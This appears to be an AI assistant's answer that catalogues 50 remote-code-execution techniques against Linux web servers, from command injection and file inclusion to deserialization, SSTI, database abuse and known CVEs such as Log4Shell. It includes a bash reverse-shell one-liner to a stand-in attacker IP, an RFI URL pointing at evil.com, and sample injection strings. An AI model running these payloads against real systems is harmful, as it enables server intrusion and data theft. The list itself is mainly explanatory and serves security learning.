

Gaining entry into a Linux server from the outside involves a transition from **untrusted data** (the web request) to **trusted execution** (the terminal).

### The Journey: From External Request to Internal Shell

Typically, an attacker follows these stages:

1. **Reconnaissance:** Scanning for open ports (80, 443) and identifying the web stack (e.g., PHP on Apache).
2. **Fuzzing:** Sending unexpected characters (like `;`, `|`, or `{{ }}`) to see how the application reacts.
3. **Exploitation:** Triggering a vulnerability that allows "Code Injection."
4. **Weaponization:** Crafting a "Reverse Shell" payload (e.g., `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`).
5. **Execution:** The Linux server connects back to the attacker, providing a terminal prompt.

---

### 50 RCE Attack Vectors and Techniques

#### Category 1: OS Command Injection (Direct Shell Access)

*These exploit the application's habit of passing user input to system shells.*

1. **Direct Semicolon Injection:** Using `;` to end a legitimate command and start a new one (e.g., `ping 8.8.8.8; id`).
2. **Pipe Injection:** Using `|` to pass the output of one command into a malicious one.
3. **Background Execution:** Using `&` to run a malicious command in the background while the UI stays responsive.
4. **Logical "AND" Injection:** Using `&&` so the second command runs only if the first succeeds.
5. **Logical "OR" Injection:** Using `||` so the second command runs if the first fails.
6. **Command Substitution (Backticks):** Using ``id`` to execute code inside another command.
7. **Command Substitution (Dollar):** Using `$(id)` for the same purpose as backticks but with nesting.
8. **Newline Injection:** Using `%0a` (encoded `\n`) to break a command line in a web request.
9. **Null Byte Injection:** Using `%00` to terminate a string early, bypassing file extension checks.
10. **Global Variable Manipulation:** Overwriting `$PATH` or `$LD_PRELOAD` to force the server to run malicious binaries.

#### Category 2: File-Based Vulnerabilities

*Exploiting how the server handles, includes, or saves files.*

11. **Remote File Inclusion (RFI):** Forcing the app to load a script from an external URL (e.g., `?page=http://evil.com/shell.php`).
12. **Local File Inclusion (LFI):** Including local system files (like `/etc/passwd`) or log files containing injected code.
13. **Log Poisoning:** Injecting PHP/Python code into access logs via the `User-Agent` header, then using LFI to execute that log.
14. **Unrestricted File Upload:** Uploading a `.php` or `.py` web shell directly to a publicly accessible folder.
15. **Double Extension Bypass:** Uploading `shell.php.jpg` to trick filters that only look at the final extension.
16. **Null Byte Upload:** Naming a file `shell.php%00.jpg` to bypass validation while saving it as a `.php` file.
17. **Path Traversal to RCE:** Navigating to a writable directory (e.g., `/tmp/`) and writing a script.
18. **ZIP Slip:** Uploading a ZIP file with "traversal" filenames (`../../tmp/shell.php`) that extract to sensitive locations.
19. **ImageTragick:** Exploiting ImageMagick vulnerabilities via specially crafted image metadata.
20. **PDF Generation Injection:** Injecting JavaScript or HTML into PDF generators that use headless browsers (like wkhtmltopdf).

#### Category 3: Language & Framework Specifics

*Targeting the "engines" like PHP, Python, Java, or Node.js.*

21. **PHP `eval()` Injection:** Passing code into the dangerous `eval()` function.
22. **Python `exec()`/`eval()`:** Similar to PHP, executing dynamic Python strings from user input.
23. **Server-Side Template Injection (SSTI):** Injecting code into engines like Jinja2, Mako, or Smarty.
24. **Insecure Deserialization (Java/PHP/Python):** Sending a serialized object that executes a payload upon reconstruction.
25. **Node.js `child_process` Abuse:** Exploiting functions like `exec()` or `spawn()` in JavaScript.
26. **Ruby on Rails "unsafe load":** Exploiting YAML or JSON parsers that can instantiate arbitrary classes.
27. **Expression Language (EL) Injection:** Targeting Java Spring or JSF frameworks via `${...}` syntax.
28. **OGNL Injection:** Specifically targeting Apache Struts to execute arbitrary Java.
29. **PHP `assert()`:** Using the assertion function to execute arbitrary code (pre-PHP 7.2).
30. **CGI-BIN Exploits:** Targeting old-school gateway scripts that pass environment variables directly to the shell.

#### Category 4: Database & Indirect RCE

*Using the database or other services to reach the OS.*

31. **SQLi to `into outfile`:** Using SQL Injection to write a web shell directly to the disk.
32. **PostgreSQL `copy from program`:** Using Postgres permissions to run shell commands.
33. **MSSQL `xp_cmdshell`:** Enabling a legacy stored procedure to run Windows/Linux commands.
34. **Redis Unauthenticated Access:** Writing a malicious SSH key or cron job directly to the Redis data file on disk.
35. **Memcached Injection:** Using the key-value store to inject serialized objects.
36. **NoSQL Injection to RCE:** Exploiting MongoDB's `$where` operator to run server-side JavaScript.
37. **LDAP Injection:** Manipulating directory queries to bypass authentication and eventually reach an admin console.
38. **Email Header Injection:** Injecting extra arguments into the `sendmail` command via a "Contact Us" form.
39. **SSRF to Local Services:** Using Server-Side Request Forgery to hit internal APIs (like Docker or AWS Metadata) to gain RCE.
40. **GraphQL Alias Overloading:** Using complex GraphQL queries to cause resource exhaustion or trigger backend flaws.

#### Category 5: Infrastructure & Config Flaws

*Exploiting the environment surrounding the web app.*

41. **Shellshock (CVE-2014-6271):** Exploiting how Bash handles environment variables in CGI scripts.
42. **Log4Shell (CVE-2021-44228):** Using JNDI lookups in Java logging to download and run remote classes.
43. **Docker Socket Exposure:** If `/var/run/docker.sock` is mounted in a container, an attacker can escape to the host.
44. **Cron Job Overwrite:** Writing a malicious script to a world-writable directory that a system cron job executes.
45. **Sudo NOPASSWD Exploitation:** If the web user can run even one binary as sudo, they may use it to read/write any file.
46. **Weak Webmin/Virtualmin Creds:** Brute-forcing web management panels to run commands via their "Terminal" module.
47. **Git Repository Exposure:** Downloading the `.git` folder, finding secrets, and using them to log in via SSH.
48. **Environment Variable Leak:** Reading `.env` files to find API keys or database passwords for lateral movement.
49. **Ghostscript Vulnerabilities:** Exploiting EPS/PS file processing to run commands.
50. **Supply Chain (NPM/PyPI/Composer):** Compromising a dependency so that when the server runs `npm install`, it executes a backdoor.

---

Would you like me to create a **Hardening Guide** for one of these specific categories to show you how to block these 50 vectors?